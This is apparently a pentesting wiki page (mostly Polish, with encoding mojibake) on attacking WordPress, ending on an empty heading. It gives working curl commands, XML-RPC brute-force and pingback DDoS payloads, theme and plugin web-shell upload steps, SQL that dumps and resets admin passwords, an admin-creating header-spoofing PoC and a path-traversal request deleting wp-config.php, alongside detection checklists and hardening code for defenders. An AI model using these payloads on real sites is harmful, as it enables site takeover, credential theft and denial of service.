# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

- **Wgrane** pliki trafiajÄ… do: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Pliki motywÃ³w moÅ¼na znaleÅºÄ‡ w /wp-content/themes/,** wiÄ™c jeÅ›li zmienisz jakiÅ› php motywu, aby uzyskaÄ‡ RCE prawdopodobnie uÅ¼yjesz tej Å›cieÅ¼ki. Na przykÅ‚ad: uÅ¼ywajÄ…c **theme twentytwelve** moÅ¼esz **access** plik **404.php** w: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- W pliku **wp-config.php** moÅ¼esz znaleÅºÄ‡ hasÅ‚o uÅ¼ytkownika root bazy danych.
- DomyÅ›lne Å›cieÅ¼ki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **GÅ‚Ã³wne pliki WordPress**

- `index.php`
- `license.txt` zawiera uÅ¼yteczne informacje, takie jak zainstalowana wersja WordPress.
- `wp-activate.php` jest uÅ¼ywany do procesu aktywacji email podczas zakÅ‚adania nowej strony WordPress.
- Foldery logowania (mogÄ… byÄ‡ przemianowane, aby je ukryÄ‡):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` to plik reprezentujÄ…cy funkcjÄ™ WordPress, ktÃ³ra umoÅ¼liwia przesyÅ‚anie danych z HTTP jako mechanizmem transportu i XML jako mechanizmem kodowania. Tego rodzaju komunikacja zostaÅ‚a zastÄ…piona przez WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` to gÅ‚Ã³wny katalog, w ktÃ³rym przechowywane sÄ… plugins i themes.
- `wp-content/uploads/` to katalog, w ktÃ³rym przechowywane sÄ… wszystkie pliki przesÅ‚ane na platformÄ™.
- `wp-includes/` to katalog, w ktÃ³rym przechowywane sÄ… pliki core, takie jak certyfikaty, fonty, pliki JavaScript i widgety.
- `wp-sitemap.xml` W wersjach WordPress 5.5 i wyÅ¼szych, WordPress generuje plik sitemap XML zawierajÄ…cy wszystkie publiczne wpisy oraz publicznie queryable typy wpisÃ³w i taksonomie.

**Post exploitation**

- Plik `wp-config.php` zawiera informacje wymagane przez WordPress do poÅ‚Ä…czenia z bazÄ… danych, takie jak nazwa bazy danych, host bazy, nazwa uÅ¼ytkownika i hasÅ‚o, authentication keys and salts oraz prefiks tabel bazy danych. Ten plik konfiguracyjny moÅ¼na rÃ³wnieÅ¼ uÅ¼yÄ‡ do aktywacji trybu DEBUG, co moÅ¼e byÄ‡ przydatne przy rozwiÄ…zywaniu problemÃ³w.

### Uprawnienia uÅ¼ytkownikÃ³w

- **Administrator**
- **Editor**: Publikuje i zarzÄ…dza swoimi oraz cudzymi wpisami
- **Author**: Publikuje i zarzÄ…dza wÅ‚asnymi wpisami
- **Contributor**: Pisze i zarzÄ…dza swoimi wpisami, ale nie moÅ¼e ich publikowaÄ‡
- **Subscriber**: PrzeglÄ…da wpisy i edytuje swÃ³j profil

## **Passive Enumeration**

### **Get WordPress version**

SprawdÅº, czy moÅ¼esz znaleÅºÄ‡ pliki `/license.txt` lub `/readme.html`

W kodzie ÅºrÃ³dÅ‚owym strony (przykÅ‚ad z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Pliki linkÃ³w CSS

![](<../../images/image (533).png>)

- Pliki JavaScript

![](<../../images/image (524).png>)

### Pobierz wtyczki
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobierz motywy
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### OgÃ³lne wyodrÄ™bnianie wersji
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktywna enumeracja

### Wtyczki i motywy

Prawdopodobnie nie bÄ™dziesz w stanie znaleÅºÄ‡ wszystkich moÅ¼liwych Wtyczek i MotywÃ³w. Aby odkryÄ‡ je wszystkie, bÄ™dziesz musiaÅ‚ **actively Brute Force a list of Plugins and Themes** (miejmy nadziejÄ™, Å¼e istniejÄ… automatyczne narzÄ™dzia, ktÃ³re zawierajÄ… te listy).

### UÅ¼ytkownicy

- **ID Brute:** Uzyskujesz prawidÅ‚owych uÅ¼ytkownikÃ³w z witryny WordPress przez Brute Forcing ID uÅ¼ytkownikÃ³w:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi to **200** lub **30X**, oznacza to, Å¼e id jest **prawidÅ‚owe**. JeÅ›li odpowiedÅº to **400**, oznacza to, Å¼e id jest **nieprawidÅ‚owe**.

- **wp-json:** MoÅ¼esz teÅ¼ sprÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach, wykonujÄ…c zapytanie:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Kolejny endpoint `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach, to:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZauwaÅ¼, Å¼e ten endpoint ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali post. **Dostarczone zostanÄ… tylko informacje o uÅ¼ytkownikach, ktÃ³rzy majÄ… tÄ™ funkcjÄ™ wÅ‚Ä…czonÄ…**.

ZwrÃ³Ä‡ rÃ³wnieÅ¼ uwagÄ™, Å¼e **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Podczas logowania przez **`/wp-login.php`** **komunikat** jest **inny** w zaleÅ¼noÅ›ci od tego, czy **nazwa uÅ¼ytkownika istnieje czy nie**.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywny, moÅ¼esz przeprowadziÄ‡ credentials brute-force lub uÅ¼yÄ‡ go do uruchomienia DoS na inne zasoby. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Aby sprawdziÄ‡, czy jest aktywny, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wyÅ›lij to Å¼Ä…danie:

**SprawdÅº**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** to niektÃ³re z metod, ktÃ³re moÅ¼na uÅ¼yÄ‡ do brute-force credentials. JeÅ›li znajdziesz ktÃ³rÄ…kolwiek z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› takiego:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Komunikat _"Incorrect username or password"_ w odpowiedzi z kodem 200 powinien siÄ™ pojawiÄ‡, jeÅ›li dane uwierzytelniajÄ…ce sÄ… nieprawidÅ‚owe.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

UÅ¼ywajÄ…c prawidÅ‚owych danych uwierzytelniajÄ…cych moÅ¼esz przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Omijanie 2FA**

Ta metoda jest przeznaczona dla programÃ³w, nie dla ludzi, i jest stara, wiÄ™c nie obsÅ‚uguje 2FA. JeÅ›li wiÄ™c masz waÅ¼ne creds, ale gÅ‚Ã³wne wejÅ›cie jest chronione 2FA, **moÅ¼esz byÄ‡ w stanie naduÅ¼yÄ‡ xmlrpc.php, aby zalogowaÄ‡ siÄ™ tymi creds, omijajÄ…c 2FA**. ZwrÃ³Ä‡ uwagÄ™, Å¼e nie bÄ™dziesz mÃ³gÅ‚ wykonaÄ‡ wszystkich akcji dostÄ™pnych przez console, ale nadal moÅ¼esz dojÅ›Ä‡ do RCE, jak Ippsec wyjaÅ›nia w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS lub skanowanie portÃ³w**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **tysiÄ…ce** of Wordpress **sites** to **dostÄ™p** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** **przeskanowaÄ‡** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

JeÅ›li otrzymasz **faultCode** o wartoÅ›ci **wiÄ™kszej** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

Zobacz uÅ¼ycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak naduÅ¼yÄ‡ tej metody, by spowodowaÄ‡ DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ten plik zwykle znajduje siÄ™ w katalogu gÅ‚Ã³wnym strony WordPress: **`/wp-cron.php`**\
Kiedy ten plik jest **wywoÅ‚ywany**, wykonywane jest â€heavyâ€ MySQL **query**, wiÄ™c moÅ¼e byÄ‡ uÅ¼yty przez **atakujÄ…cych** do **wywoÅ‚ania** **DoS**.\
DomyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym Å‚adowaniu strony (za kaÅ¼dym razem, gdy klient Å¼Ä…da dowolnej strony WordPress), co na stronach o duÅ¼ym ruchu moÅ¼e powodowaÄ‡ problemy (DoS).

Zalecane jest wyÅ‚Ä…czenie Wp-Cron i utworzenie prawdziwego cronjoba na hoÅ›cie, ktÃ³ry bÄ™dzie wykonywaÅ‚ potrzebne dziaÅ‚ania w regularnych odstÄ™pach (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i strona WordPress moÅ¼e wykonaÄ‡ Å¼Ä…danie do Ciebie.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

To narzÄ™dzie sprawdza, czy istnieje **methodName: pingback.ping** oraz Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy**, i jeÅ›li tak, prÃ³buje je wykorzystaÄ‡.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Uzyskaj dostÄ™p przez nadpisanie bitu

To raczej ciekawostka niÅ¼ prawdziwy atak. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼na byÅ‚o zmieniÄ‡ 1 bit w dowolnym pliku wordpress. DziÄ™ki temu moÅ¼na byÅ‚o zmieniÄ‡ bit na pozycji `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zamieniÄ‡ operacjÄ™ NOT (`!`) na NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja php z uÅ¼ywanego motywu (wymagane dane logowania admina)**

WyglÄ…d â†’ Edytor motywu â†’ Szablon 404 (po prawej)

ZamieÅ„ zawartoÅ›Ä‡ na php shell:

![](<../../images/image (384).png>)

Wyszukaj w internecie, jak uzyskaÄ‡ dostÄ™p do zaktualizowanej strony. W tym przypadku musisz wejÅ›Ä‡ tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
aby uzyskaÄ‡ sesjÄ™.

## Plugin RCE

### Wtyczka PHP

MoÅ¼liwe, Å¼e da siÄ™ przesÅ‚aÄ‡ pliki .php jako wtyczkÄ™.\
UtwÃ³rz swÃ³j PHP backdoor uÅ¼ywajÄ…c na przykÅ‚ad:

![](<../../images/image (183).png>)

NastÄ™pnie dodaj nowÄ… wtyczkÄ™:

![](<../../images/image (722).png>)

PrzeÅ›lij wtyczkÄ™ i kliknij Install Now:

![](<../../images/image (249).png>)

Kliknij na Procced:

![](<../../images/image (70).png>)

Prawdopodobnie nic siÄ™ nie stanie, ale jeÅ›li przejdziesz do Media, zobaczysz przesÅ‚any shell:

![](<../../images/image (462).png>)

OtwÃ³rz go i zobaczysz URL umoÅ¼liwiajÄ…cy uruchomienie reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ta metoda polega na zainstalowaniu zÅ‚oÅ›liwej wtyczki znanej z podatnoÅ›ci i moÅ¼e zostaÄ‡ wykorzystana do uzyskania web shell. Proces ten jest przeprowadzany przez WordPress dashboard w nastÄ™pujÄ…cy sposÃ³b:

1. **Pozyskanie wtyczki**: Wtyczka jest pobierana ze ÅºrÃ³dÅ‚a takiego jak Exploit DB jak [**here**](https://www.exploit-db.com/exploits/36374).
2. **Instalacja wtyczki**:
- PrzejdÅº do WordPress dashboard, potem do `Dashboard > Plugins > Upload Plugin`.
- PrzeÅ›lij plik zip pobranej wtyczki.
3. **Aktywacja wtyczki**: Po pomyÅ›lnej instalacji wtyczka musi zostaÄ‡ aktywowana przez dashboard.
4. **Eksploatacja**:
- Z zainstalowanÄ… i aktywowanÄ… wtyczkÄ… "reflex-gallery" moÅ¼na jÄ… wykorzystaÄ‡, poniewaÅ¼ jest znana z podatnoÅ›ci.
- Metasploit framework dostarcza exploit dla tej podatnoÅ›ci. ÅadujÄ…c odpowiedni moduÅ‚ i wykonujÄ…c konkretne polecenia, moÅ¼na uzyskaÄ‡ sesjÄ™ meterpreter, zapewniajÄ…c nieautoryzowany dostÄ™p do serwisu.
- NaleÅ¼y zaznaczyÄ‡, Å¼e to tylko jedna z wielu metod wykorzystywania witryny WordPress.

TreÅ›Ä‡ zawiera materiaÅ‚y wizualne ilustrujÄ…ce kroki w WordPress dashboard podczas instalacji i aktywacji wtyczki. NaleÅ¼y jednak pamiÄ™taÄ‡, Å¼e wykorzystywanie podatnoÅ›ci w ten sposÃ³b jest nielegalne i nieetyczne bez odpowiedniej autoryzacji. Informacje te powinny byÄ‡ uÅ¼ywane odpowiedzialnie i tylko w legalnym kontekÅ›cie, takim jak pentesting z wyraÅºnÄ… zgodÄ….

**Dla bardziej szczegÃ³Å‚owych krokÃ³w sprawdÅº:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Od XSS do RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ to skrypt zaprojektowany do eskalacji podatnoÅ›ci **Cross-Site Scripting (XSS)** do **Remote Code Execution (RCE)** lub innych krytycznych podatnoÅ›ci w WordPress. Po wiÄ™cej informacji sprawdÅº [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Zapewnia **wsparcie dla Wordpress Versions 6.X.X, 5.X.X and 4.X.X. oraz pozwala na:**
- _**Privilege Escalation:**_ Tworzy uÅ¼ytkownika w WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ PrzeÅ›lij swÃ³j custom plugin (backdoor) do WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edytuje wbudowane pluginy w WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edytuje wbudowane motywy w WordPress.
- _**(Custom) Custom Exploits:**_ Niestandardowe exploity dla third-party WordPress Plugins/Themes.

## Po eksploatacji

WyodrÄ™bnij nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ hasÅ‚o admina:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest wtyczek Wordpress

### Powierzchnia ataku

ZnajomoÅ›Ä‡ sposobÃ³w, w jakie wtyczka Wordpress moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›Ä‡, jest kluczowa do znalezienia podatnoÅ›ci w jej funkcjach. PoniÅ¼ej znajdziesz, jak wtyczka moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›Ä‡ oraz kilka przykÅ‚adÃ³w podatnych wtyczek w [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jednym ze sposobÃ³w, w jaki wtyczka moÅ¼e udostÄ™pniaÄ‡ funkcje uÅ¼ytkownikom, sÄ… obsÅ‚ugiwacze AJAX. MogÄ… one zawieraÄ‡ bÅ‚Ä™dy logiczne, autoryzacji lub uwierzytelniania. Co wiÄ™cej, doÅ›Ä‡ czÄ™sto te funkcje opierajÄ… zarÃ³wno uwierzytelnianie, jak i autoryzacjÄ™ na istnieniu wordpress nonce, ktÃ³re moÅ¼e posiadaÄ‡ **kaÅ¼dy uÅ¼ytkownik zalogowany w instancji Wordpress** (niezaleÅ¼nie od jego roli).

Te funkcje mogÄ… byÄ‡ uÅ¼yte do udostÄ™pnienia funkcji w wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**UÅ¼ycie `nopriv` sprawia, Å¼e endpoint jest dostÄ™pny dla wszystkich uÅ¼ytkownikÃ³w (nawet niezalogowanych).**

> [!CAUTION]
> Co wiÄ™cej, jeÅ›li funkcja jedynie sprawdza autoryzacjÄ™ uÅ¼ytkownika za pomocÄ… funkcji `wp_verify_nonce`, to funkcja ta tylko weryfikuje, Å¼e uÅ¼ytkownik jest zalogowany â€” zwykle nie sprawdza roli uÅ¼ytkownika. W efekcie uÅ¼ytkownicy o niskich uprawnieniach mogÄ… mieÄ‡ dostÄ™p do operacji wymagajÄ…cych wyÅ¼szych uprawnieÅ„.

- **REST API**

MoÅ¼liwe jest teÅ¼ udostÄ™pnienie funkcji z wordpress poprzez zarejestrowanie REST API za pomocÄ… funkcji `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` to callback do funkcji, ktÃ³ra sprawdza, czy dany uÅ¼ytkownik jest uprawniony do wywoÅ‚ania metody API.

**JeÅ›li uÅ¼yta jest wbudowana funkcja `__return_true`, po prostu pominie sprawdzenie uprawnieÅ„ uÅ¼ytkownika.**

- **BezpoÅ›redni dostÄ™p do pliku php**

OczywiÅ›cie Wordpress uÅ¼ywa PHP, a pliki wewnÄ…trz pluginÃ³w sÄ… bezpoÅ›rednio dostÄ™pne z sieci. JeÅ›li wiÄ™c plugin ujawnia podatnÄ… funkcjonalnoÅ›Ä‡, ktÃ³ra uruchamia siÄ™ po samym dostÄ™pie do pliku, bÄ™dzie ona eksploatowalna przez dowolnego uÅ¼ytkownika.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

NiektÃ³re pluginy implementujÄ… â€œtrusted headerâ€ skrÃ³ty dla integracji wewnÄ™trznych lub reverse proxy i nastÄ™pnie uÅ¼ywajÄ… tego nagÅ‚Ã³wka do ustawienia kontekstu bieÅ¼Ä…cego uÅ¼ytkownika dla Å¼Ä…daÅ„ REST. JeÅ›li nagÅ‚Ã³wek nie jest kryptograficznie powiÄ…zany z Å¼Ä…daniem przez komponent nadrzÄ™dny, atakujÄ…cy moÅ¼e go sfaÅ‚szowaÄ‡ i wywoÅ‚aÄ‡ uprzywilejowane trasy REST jako administrator.

- Skutek: nieautoryzowana eskalacja uprawnieÅ„ do administratora przez utworzenie nowego administratora za pomocÄ… core users REST route.
- PrzykÅ‚adowy nagÅ‚Ã³wek: `X-Wcpay-Platform-Checkout-User: 1` (wymusza ID uÅ¼ytkownika 1, zwykle pierwsze konto administratora).
- Eksploatowana trasa: `POST /wp-json/wp/v2/users` z tablicÄ… roli nadajÄ…cÄ… wyÅ¼sze uprawnienia.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Dlaczego to dziaÅ‚a

- Wtyczka mapuje nagÅ‚Ã³wek kontrolowany przez klienta na stan uwierzytelnienia i pomija sprawdzenia uprawnieÅ„ (capability checks).
- WordPress core oczekuje uprawnienia `create_users` dla tej Å›cieÅ¼ki; hack wtyczki omija to, ustawiajÄ…c bezpoÅ›rednio kontekst bieÅ¼Ä…cego uÅ¼ytkownika z nagÅ‚Ã³wka.

Oczekiwane wskaÅºniki sukcesu

- HTTP 201 z ciaÅ‚em JSON opisujÄ…cym utworzonego uÅ¼ytkownika.
- Nowy uÅ¼ytkownik z uprawnieniami admin widoczny w `wp-admin/users.php`.

Lista kontrolna wykrywania

- Przeszukaj (grep) pod kÄ…tem `getallheaders()`, `$_SERVER['HTTP_...']` lub SDK dostawcÃ³w, ktÃ³re odczytujÄ… niestandardowe nagÅ‚Ã³wki, aby ustawiÄ‡ kontekst uÅ¼ytkownika (np. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Przejrzyj rejestracje REST pod kÄ…tem uprzywilejowanych callbackÃ³w, ktÃ³rym brakuje solidnych sprawdzeÅ„ `permission_callback` i ktÃ³re zamiast tego polegajÄ… na nagÅ‚Ã³wkach Å¼Ä…daÅ„.
- Szukaj uÅ¼yÄ‡ podstawowych funkcji zarzÄ…dzania uÅ¼ytkownikami (`wp_insert_user`, `wp_create_user`) wewnÄ…trz handlerÃ³w REST, ktÃ³re sÄ… zabezpieczone jedynie przez wartoÅ›ci nagÅ‚Ã³wkÃ³w.

Wzmocnienie

- Nigdy nie wyprowadzaj uwierzytelnienia ani autoryzacji z nagÅ‚Ã³wkÃ³w kontrolowanych przez klienta.
- JeÅ›li reverse proxy musi wstrzykiwaÄ‡ toÅ¼samoÅ›Ä‡, zakoÅ„cz zaufanie przy proxy i usuÅ„ przychodzÄ…ce kopie (np. `unset X-Wcpay-Platform-Checkout-User` na krawÄ™dzi), nastÄ™pnie przekaÅ¼ podpisany token i zweryfikuj go po stronie serwera.
- Dla tras REST wykonujÄ…cych uprzywilejowane akcje wymagaj sprawdzeÅ„ `current_user_can()` i rygorystycznego `permission_callback` (NIE uÅ¼ywaj `__return_true`).
- Preferuj uwierzytelnianie pierwszej strony (cookies, application passwords, OAuth) zamiast â€impersonationâ€ przez nagÅ‚Ã³wki.

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemy wprowadzone przez ten fragment:

* **DostÄ™p bez uwierzytelnienia** â€“ zarejestrowano hook `wp_ajax_nopriv_`.
* **Brak sprawdzania nonce / uprawnieÅ„** â€“ kaÅ¼dy odwiedzajÄ…cy moÅ¼e trafiÄ‡ do tego endpointu.
* **Brak sanitizacji Å›cieÅ¼ki** â€“ ciÄ…g sterowany przez uÅ¼ytkownika `fontfamily` jest konkatenowany do Å›cieÅ¼ki w systemie plikÃ³w bez filtrowania, pozwalajÄ…c na klasyczny `../../` traversal.

#### Eksploatacja

AtakujÄ…cy moÅ¼e usunÄ…Ä‡ dowolny plik lub katalog **poniÅ¼ej katalogu bazowego uploads** (zazwyczaj `<wp-root>/wp-content/uploads/`) wysyÅ‚ajÄ…c pojedyncze Å¼Ä…danie HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
PoniewaÅ¼ `wp-config.php` znajduje siÄ™ poza katalogiem *uploads*, w domyÅ›lnej instalacji wystarczÄ… cztery sekwencje `../`. UsuniÄ™cie `wp-config.php` wymusza na WordPress uruchomienie *installation wizard* przy nastÄ™pnym odwiedzeniu strony, co umoÅ¼liwia peÅ‚ne przejÄ™cie serwisu (atakujÄ…cy jedynie dostarcza nowÄ… konfiguracjÄ™ DB i tworzy uÅ¼ytkownika admin).

Inne istotne cele to pliki `.php` w pluginach/motywach (aby zÅ‚amaÄ‡ wtyczki zabezpieczajÄ…ce) lub reguÅ‚y `.htaccess`.

#### Lista kontrolna detekcji

* KaÅ¼dy callback `add_action( 'wp_ajax_nopriv_...')`, ktÃ³ry wywoÅ‚uje helpery systemu plikÃ³w (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* ÅÄ…czenie niesanitizowanych danych wejÅ›ciowych od uÅ¼ytkownika w Å›cieÅ¼ki (szukaj `$_POST`, `$_GET`, `$_REQUEST`).
* Brak `check_ajax_referer()` oraz `current_user_can()`/`is_user_logged_in()`.

#### Utwardzanie
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Zawsze** traktuj kaÅ¼dÄ… operacjÄ™ zapisu/usuniÄ™cia na dysku jako uprzywilejowanÄ… i sprawdÅº dwukrotnie:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

